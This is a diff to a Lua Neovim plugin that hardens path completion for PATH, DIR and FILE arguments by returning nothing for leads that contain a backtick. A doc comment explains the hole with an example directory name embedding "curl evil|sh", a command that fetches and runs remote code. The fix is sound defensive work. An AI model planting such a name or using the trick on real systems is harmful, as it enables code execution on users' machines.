@@ -142,12 +142,29 @@ M.register("BOOL", {
 -- the handler decides), strict for DIR/FILE. All three expand `~`, `$VAR`,
 -- `${VAR}` and `%VAR%` before validating/returning, so e.g. `root=$REPOS_DIR`
 -- resolves instead of failing "not a directory" on the literal token.
+---@internal
+--- `vim.fn.getcompletion` for a path lead typed by the user -- or inserted by an
+--- earlier completion. A backtick in the lead is a command substitution to
+--- Vim's wildcard expansion: a directory named like "x`curl evil|sh`" in a
+--- downloaded folder would run its text the next time <Tab> is pressed on it.
+--- Such a lead completes to nothing.
+---@param arg_lead string
+---@param kind "file"|"dir"
+---@return string[]
+local function path_completion(arg_lead, kind)
+  if arg_lead:find("`", 1, true) then
+    return {}
+  end
+  local ok, list = pcall(vim.fn.getcompletion, arg_lead, kind)
+  return ok and list or {}
+end
+
 M.register("PATH", {
   validate = function(raw)
     return true, expand_path(raw), nil
   end,
   complete = function(arg_lead)
-    return vim.fn.getcompletion(arg_lead, "file")
+    return path_completion(arg_lead, "file")
   end,
 })
 
@@ -160,7 +177,7 @@ M.register("DIR", {
     return true, expanded, nil
   end,
   complete = function(arg_lead)
-    return vim.fn.getcompletion(arg_lead, "dir")
+    return path_completion(arg_lead, "dir")
   end,
 })
 
@@ -174,7 +191,7 @@ M.register("FILE", {
     return true, expanded, nil
   end,
   complete = function(arg_lead)
-    return vim.fn.getcompletion(arg_lead, "file")
+    return path_completion(arg_lead, "file")
   end,
 })
 
